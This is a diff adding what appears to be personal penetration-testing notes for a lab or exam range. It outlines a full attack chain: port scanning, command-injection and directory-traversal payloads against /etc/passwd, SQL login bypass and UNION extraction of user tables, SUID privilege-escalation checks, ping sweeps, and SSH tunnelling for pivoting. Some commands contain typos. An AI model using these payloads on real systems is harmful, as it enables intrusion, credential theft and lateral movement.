@@ -1,0 +1,180 @@
+given ip = 10.50.33.213
+
+nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p-
+
+nc 10.50.33.213 <open port>
+
+document it
+
+		#### NMAP Scan Results ####
+		nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p- 
+		PORT		STATE		SERVICE
+		22/tcp		open		ssh
+		80/tcp		open		http
+		
+nmap -Pn -T4 --min-rate 243232525 10.50.33.213 -p- --script http-enum.nse
+nikto -h 10.50.33.213
+
+document it
+		
+		#### --script http-enum.nse ####
+		copy and paste result
+		
+view webpage
+see what you can do
+
+document it
+		
+		#### 10.50.33.213 ####
+		note the input field
+		<url>
+		
+Attempt
+Command injection
+; whoami
+; pwd
+
+document it
+		####
+		note that it didn't work
+		
+Attempt
+directory traversal
+../../../../../../../../../../../../../../../../../../../etc/passwd
+
+document it
+		
+		####
+		note USERS AND THEIR SHELL
+		
+CHECK /ETC/HOSTS
+../../../../../../../../../../../../../../../../../../../etc/hosts
+
+document it 
+
+		####
+		note the next pivot
+
+*IF YOU CAN GET A WEBSHELL ON YOUR BOX DO SSH KEYGEN*
+
+generate keygen from lin-ops
+
+Username and Password = SQL Injection
+
+Username: 
+' or 1='1
+Password:
+' or 1='1
+
+go f12
+network and refresh
+click on post
+click on request
+click on raw
+copy and paste username after the .php?
+
+document it
+		
+		####
+		copy and paste results
+		base 64/ROT13 encrypted password
+		
+ssh using new found creds
+whoami
+hostname
+bash
+sudo -l
+find / -type f -perm /4000 -ls 2>dev/null
+					 /2000
+					 /6000
+					 
+gtfobins
+
+document it
+			
+			####
+			note NO ESCALATION
+			
+ip neigh
+as a last resort
+
+for i in  {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+document it 
+		
+		#### for i in  {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done ####
+		copy and paste results
+		
+make a dynamic tunnel
+ssh user@IP -D 9050
+
+proxychains nmap -Pn -T4 --min-rate 243232525 192.168.28.181 -p-
+
+nc 192.168.28.181 <open port>
+
+document it
+
+		nmap -Pn -T4 --min-rate 243232525 192.168.28.181 -p-
+		PORT		STATE		SERVICE
+		22/tcp		open		ssh
+		80/tcp		open		http
+
+ssh -M -S ~/.ssh/cm/T1 -o "ControlPersis=10m" user@IP
+
+ssh -S ~/.ssh/cm/T1 -O forward -L8888:192.168.28.181:80 place
+
+credential reuse
+
+SQL INJECTIONS
+
+figure out how it works
+
+test every single option 1-9+
+0.0.0.0:portnum/asdasd.php?variable=7 or 1=1#;
+
+document it
+
+			####
+			varialble name and vuln option(s)
+			
+find number of columns with UNION
+
+0.0.0.0:portnum/asdasd.php?variable=7 UNION SELECT 1,2,3;#
+
+THERE WILL BE MORE COLUMNS!!!!!!!!!!!
+
+UNION SELECT table_schema, column_names, table_name FROM information_schema.columns;#
+
+Defaults:
+information_schema, mysql, performance_schema
+
+UNION SELECT name,username,user_id FROM siteuser.users;#
+
+document it
+
+			####
+			annotate any new users/passwd
+			annotate if you can or cannot get in the box
+			
+scan the next box
+
+sudo vim /etc/proxychains.conf
+tcp_read_time 8000
+tcp_connect_time_out 600
+
+
+nmap -Pn -T4 --min-rate 243232525 <newIP> -p- 2>/dev/null
+
+try to ssh into the box Aaron's creds
+'A'aron@IP 
+
+hostname
+whoami
+sudo -l
+	use the command
+	*gtfobins*
+cat /etc/hosts
+
+find / -type f -perm /4000 -ls 2>dev/null
+					 /2000
+					 /6000
